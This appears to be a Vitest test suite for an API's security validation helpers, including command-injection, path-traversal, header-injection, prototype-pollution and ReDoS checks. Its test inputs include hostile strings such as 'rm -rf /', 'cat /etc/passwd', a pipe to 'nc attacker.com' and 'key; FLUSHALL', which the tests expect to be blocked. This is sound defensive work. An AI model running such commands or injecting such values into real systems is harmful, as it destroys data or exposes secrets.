import { describe, expect, it } from 'vitest';
import {
  isSafeRegex,
  parseJSONSafely,
  preventPrototypePollution,
  sanitizeCommandArg,
  sanitizeLogOutput,
  sanitizeRedisKey,
  validateHost,
  validateJSON,
  validatePath,
  validatePayloadSize,
  validatePlayerId,
  validateString,
  withTimeout
} from '../../api/_validation';

describe('API Security Validation', () => {
  describe('validatePlayerId', () => {
    it('should accept valid player IDs', () => {
      expect(validatePlayerId(1)).toBe(1);
      expect(validatePlayerId('123')).toBe(123);
      expect(validatePlayerId(999999)).toBe(999999);
    });

    it('should reject invalid player IDs', () => {
      expect(() => validatePlayerId(0)).toThrow();
      expect(() => validatePlayerId(-1)).toThrow();
      expect(() => validatePlayerId(1000000)).toThrow(); // Too large
      expect(() => validatePlayerId(1.5)).toThrow(); // Not integer
      expect(() => validatePlayerId('abc')).toThrow();
      expect(() => validatePlayerId(NaN)).toThrow();
      expect(() => validatePlayerId(Infinity)).toThrow();
    });

    it('should reject injection attempts', () => {
      expect(() => validatePlayerId('1; DROP TABLE')).toThrow();
      expect(() => validatePlayerId('1*')).toThrow();
      expect(() => validatePlayerId('1\n2')).toThrow();
    });
  });

  describe('validateHost', () => {
    it('should accept localhost', () => {
      expect(validateHost('localhost:3000')).toBe('localhost:3000');
      expect(validateHost('localhost:5173')).toBe('localhost:5173');
    });

    it('should accept vercel.app domains', () => {
      expect(validateHost('my-app.vercel.app')).toBe('my-app.vercel.app');
      expect(validateHost('my-app-123.vercel.app')).toBe('my-app-123.vercel.app');
    });

    it('should reject unauthorized hosts', () => {
      expect(() => validateHost('evil.com')).toThrow();
      expect(() => validateHost('malicious.xyz')).toThrow();
    });

    it('should reject missing host', () => {
      expect(() => validateHost(undefined)).toThrow();
      expect(() => validateHost('')).toThrow();
    });

    it('should prevent host header injection', () => {
      expect(() => validateHost('evil.com\r\nX-Injected: true')).toThrow();
      expect(() => validateHost('localhost:3000\nevil.com')).toThrow();
    });
  });

  describe('validateString', () => {
    it('should accept valid strings', () => {
      expect(validateString('hello', 'test')).toBe('hello');
      expect(validateString('test message', 'message', 50)).toBe('test message');
    });

    it('should reject non-strings', () => {
      expect(() => validateString(123, 'test')).toThrow();
      expect(() => validateString(null, 'test')).toThrow();
      expect(() => validateString(undefined, 'test')).toThrow();
    });

    it('should reject strings exceeding max length', () => {
      const longString = 'a'.repeat(1001);
      expect(() => validateString(longString, 'test')).toThrow();

      const shortString = 'a'.repeat(10);
      expect(() => validateString(shortString, 'test', 5)).toThrow();
    });

    it('should accept strings within max length', () => {
      const validString = 'a'.repeat(100);
      expect(validateString(validString, 'test', 100)).toBe(validString);
    });
  });

  describe('sanitizeLogOutput', () => {
    it('should escape newlines', () => {
      expect(sanitizeLogOutput('line1\nline2')).toBe('line1\\nline2');
      expect(sanitizeLogOutput('line1\rline2')).toBe('line1\\rline2');
    });

    it('should escape tabs', () => {
      expect(sanitizeLogOutput('col1\tcol2')).toBe('col1\\tcol2');
    });

    it('should remove control characters', () => {
      expect(sanitizeLogOutput('hello\x00world')).toBe('helloworld');
      expect(sanitizeLogOutput('test\x1Bvalue')).toBe('testvalue');
    });

    it('should handle non-string input', () => {
      expect(sanitizeLogOutput(123)).toBe('123');
      expect(sanitizeLogOutput(null)).toBe('null');
      expect(sanitizeLogOutput(undefined)).toBe('undefined');
    });

    it('should prevent log injection', () => {
      const malicious = 'user input\n[INFO] Fake log entry';
      const sanitized = sanitizeLogOutput(malicious);
      expect(sanitized).not.toContain('\n');
      expect(sanitized).toContain('\\n');
    });
  });

  describe('sanitizeRedisKey', () => {
    it('should allow safe characters', () => {
      expect(sanitizeRedisKey('availability:11:00:123')).toBe('availability:11:00:123');
      expect(sanitizeRedisKey('player-123')).toBe('player-123');
      expect(sanitizeRedisKey('test_key')).toBe('test_key');
    });

    it('should remove dangerous characters', () => {
      expect(sanitizeRedisKey('key*')).toBe('key');
      expect(sanitizeRedisKey('key?')).toBe('key');
      expect(sanitizeRedisKey('key[abc]')).toBe('keyabc');
      expect(sanitizeRedisKey('key\nvalue')).toBe('keyvalue');
    });

    it('should prevent Redis pattern injection', () => {
      expect(sanitizeRedisKey('availability:*:*')).toBe('availability::');
      expect(sanitizeRedisKey('*')).toBe('');
      expect(sanitizeRedisKey('key[0-9]*')).toBe('key0-9'); // Trattini sono permessi
    });

    it('should handle special Redis commands', () => {
      expect(sanitizeRedisKey('DEL key')).toBe('DELkey');
      expect(sanitizeRedisKey('FLUSHALL')).toBe('FLUSHALL');
      expect(sanitizeRedisKey('key; FLUSHALL')).toBe('keyFLUSHALL');
    });
  });

  describe('Node.js Security Vulnerabilities', () => {
    describe('Prototype Pollution Protection', () => {
      it('should block __proto__ property from JSON', () => {
        const maliciousJSON = '{"user":"alice","__proto__":{"isAdmin":true}}';

        expect(() => parseJSONSafely(maliciousJSON)).toThrow('Proprietà pericolosa rilevata');
      });

      it('should block constructor property', () => {
        const maliciousJSONConstructor = '{"user":"alice","constructor":{"prototype":{"isAdmin":true}}}';

        expect(() => parseJSONSafely(maliciousJSONConstructor)).toThrow('Proprietà pericolosa rilevata');
      });

      it('should block prototype property', () => {
        const maliciousJSONPrototype = '{"user":"alice","prototype":{"isAdmin":true}}';

        expect(() => parseJSONSafely(maliciousJSONPrototype)).toThrow('Proprietà pericolosa rilevata');
      });

      it('should block nested prototype pollution', () => {
        const maliciousJSON = '{"user":{"profile":{"__proto__":{"isAdmin":true}}}}';

        expect(() => parseJSONSafely(maliciousJSON)).toThrow();
      });

      it('should block deeply nested objects (DoS prevention)', () => {
        // Crea oggetto con nesting profondo
        let deepObj: any = { value: 'test' };
        for (let i = 0; i < 15; i++) {
          deepObj = { nested: deepObj };
        }

        expect(() => preventPrototypePollution(deepObj)).toThrow('troppo profonda');
      });

      it('should allow safe objects', () => {
        const safePayload = {
          user: 'alice',
          age: 30,
          profile: {
            name: 'Alice',
            settings: {
              theme: 'dark'
            }
          }
        };

        expect(() => preventPrototypePollution(safePayload)).not.toThrow();
      });

      it('should handle arrays safely', () => {
        const payloadWithArray = {
          users: ['alice', 'bob'],
          data: [{ id: 1 }, { id: 2 }]
        };

        expect(() => preventPrototypePollution(payloadWithArray)).not.toThrow();
      });
    });

    describe('JSON Bomb Protection', () => {
      it('should reject payloads exceeding size limit', () => {
        const largePayload = {
          data: 'x'.repeat(200 * 1024) // 200KB
        };

        expect(() => validatePayloadSize(largePayload, 100 * 1024)).toThrow('Payload troppo grande');
      });

      it('should accept payloads within size limit', () => {
        const smallPayload = {
          user: 'alice',
          message: 'hello'
        };

        expect(() => validatePayloadSize(smallPayload, 100 * 1024)).not.toThrow();
      });

      it('should calculate size correctly for nested objects', () => {
        const nestedPayload = {
          level1: {
            level2: {
              level3: {
                data: 'value'
              }
            }
          }
        };

        expect(() => validatePayloadSize(nestedPayload, 1000)).not.toThrow();
      });
    });

    describe('Timeout Protection (ReDoS prevention)', () => {
      it('should timeout long-running operations', async () => {
        const slowOperation = new Promise((resolve) => {
          setTimeout(() => resolve('done'), 5000);
        });

        await expect(
          withTimeout(slowOperation, 100, 'Test timeout')
        ).rejects.toThrow('Test timeout');
      });

      it('should allow fast operations to complete', async () => {
        const fastOperation = Promise.resolve('success');

        const result = await withTimeout(fastOperation, 1000);
        expect(result).toBe('success');
      });

      it('should timeout on infinite loops (simulated)', async () => {
        const infiniteLoop = new Promise(() => {
          // Never resolves
        });

        await expect(
          withTimeout(infiniteLoop, 100)
        ).rejects.toThrow('Operazione timeout');
      });
    });

    describe('ReDoS (Regular Expression DoS) Protection', () => {
      it('should detect dangerous nested quantifiers', () => {
        expect(isSafeRegex('(a+)+')).toBe(false);
        expect(isSafeRegex('(a*)*')).toBe(false);
        expect(isSafeRegex('(a+)*')).toBe(false);
        expect(isSafeRegex('(a*)+')).toBe(false);
      });

      it('should reject excessively long patterns', () => {
        const longPattern = 'a'.repeat(150);
        expect(isSafeRegex(longPattern)).toBe(false);
      });

      it('should allow safe regex patterns', () => {
        expect(isSafeRegex('^[a-z]{1,10}$')).toBe(true);
        expect(isSafeRegex('[0-9]+')).toBe(true);
        expect(isSafeRegex('\\d{2}:\\d{2}')).toBe(true);
      });
    });

    describe('Command Injection Prevention', () => {
      it('should block shell metacharacters', () => {
        expect(() => sanitizeCommandArg('file; rm -rf /')).toThrow();
        expect(() => sanitizeCommandArg('file && cat /etc/passwd')).toThrow();
        expect(() => sanitizeCommandArg('file | nc attacker.com')).toThrow();
        expect(() => sanitizeCommandArg('file`whoami`')).toThrow();
        expect(() => sanitizeCommandArg('file$(whoami)')).toThrow();
      });

      it('should block quotes and escapes', () => {
        expect(() => sanitizeCommandArg('file\'test')).toThrow();
        expect(() => sanitizeCommandArg('file"test')).toThrow();
        expect(() => sanitizeCommandArg('file\\test')).toThrow();
      });

      it('should allow safe filenames', () => {
        expect(sanitizeCommandArg('file.txt')).toBe('file.txt');
        expect(sanitizeCommandArg('my-file_2024.log')).toBe('my-file_2024.log');
        expect(sanitizeCommandArg('data123')).toBe('data123');
      });
    });

    describe('Path Traversal Prevention', () => {
      it('should block parent directory traversal', () => {
        expect(() => validatePath('../etc/passwd', '/tmp')).toThrow('Path traversal');
        expect(() => validatePath('../../secrets', '/tmp')).toThrow('Path traversal');
        expect(() => validatePath('data/../../etc/passwd', '/tmp')).toThrow();
      });

      it('should block absolute paths', () => {
        expect(() => validatePath('/etc/passwd', '/tmp')).toThrow('Path assoluti non permessi');
        expect(() => validatePath('/var/log/app.log', '/tmp')).toThrow('Path assoluti non permessi');
      });

      it('should allow safe relative paths', () => {
        expect(() => validatePath('file.txt', '/tmp')).not.toThrow();
        expect(() => validatePath('data/file.txt', '/tmp')).not.toThrow();
        expect(() => validatePath('uploads/user123/avatar.jpg', '/tmp')).not.toThrow();
      });

      it('should normalize paths correctly', () => {
        const result = validatePath('data/./file.txt', '/tmp');
        expect(result).toContain('data/file.txt');
      });

      it('should prevent escaping base directory with complex paths', () => {
        expect(() => validatePath('data/../../../etc/passwd', '/tmp')).toThrow();
        expect(() => validatePath('data/./../../secrets', '/tmp')).toThrow();
      });
    });

    describe('Combined JSON Validation', () => {
      it('should reject payload with prototype pollution AND size issues', () => {
        const maliciousLargePayload = {
          __proto__: { isAdmin: true },
          data: 'x'.repeat(200 * 1024)
        };

        expect(() => validateJSON(maliciousLargePayload)).toThrow();
      });

      it('should accept safe, reasonable JSON', () => {
        const safePayload = {
          user: 'alice',
          settings: {
            theme: 'dark',
            notifications: true
          }
        };

        expect(() => validateJSON(safePayload)).not.toThrow();
      });
    });

    describe('Edge Cases and Attack Vectors', () => {
      it('should handle null and undefined safely', () => {
        expect(() => preventPrototypePollution(null)).not.toThrow();
        expect(() => preventPrototypePollution(undefined)).not.toThrow();
      });

      it('should handle primitive values', () => {
        expect(() => preventPrototypePollution(123)).not.toThrow();
        expect(() => preventPrototypePollution('string')).not.toThrow();
        expect(() => preventPrototypePollution(true)).not.toThrow();
      });

      it('should detect case variations of dangerous keys', () => {
        const json1 = '{"__PROTO__":{"evil":true}}';
        const json2 = '{"CONSTRUCTOR":{"evil":true}}';
        const json3 = '{"ProtoType":{"evil":true}}';

        expect(() => parseJSONSafely(json1)).toThrow();
        expect(() => parseJSONSafely(json2)).toThrow();
        expect(() => parseJSONSafely(json3)).toThrow();
      });

      it('should handle circular references gracefully', () => {
        const circular: any = { name: 'test' };
        circular.self = circular;

        // validatePayloadSize usa JSON.stringify che fallisce su circular refs
        expect(() => validatePayloadSize(circular)).toThrow();
      });
    });
  });
});
